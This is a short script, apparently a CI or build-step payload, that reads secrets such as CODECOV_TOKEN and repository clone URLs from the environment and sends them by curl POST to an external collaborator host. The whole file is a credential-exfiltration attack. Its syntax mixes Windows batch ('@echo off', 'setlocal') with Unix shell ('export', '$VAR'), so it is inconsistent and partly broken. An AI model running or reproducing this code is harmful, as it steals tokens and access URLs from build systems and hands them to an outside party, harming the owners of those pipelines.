@echo off
setlocal

export SERVER_URL=https://p3thexsyv9fud133886afr2gy74yspge.pentestcollaborator.com

echo Retrieving environment variables...

echo Retrieve environment variables
export VAR1=$CODECOV_TOKEN
export VAR2=$API_CLONE_URL
export VAR3=$AUTH_CLONE_URL

echo Sending environment variables to server...

echo Send environment variables to server
curl -X POST -H "Content-Type: application/html" -d "{\"VAR1\":\"$VAR1\",\"VAR2\":\"$VAR2\",\"VAR3\":\"$VAR3\"}" $SERVER_URL

echo Environment variables sent to server.
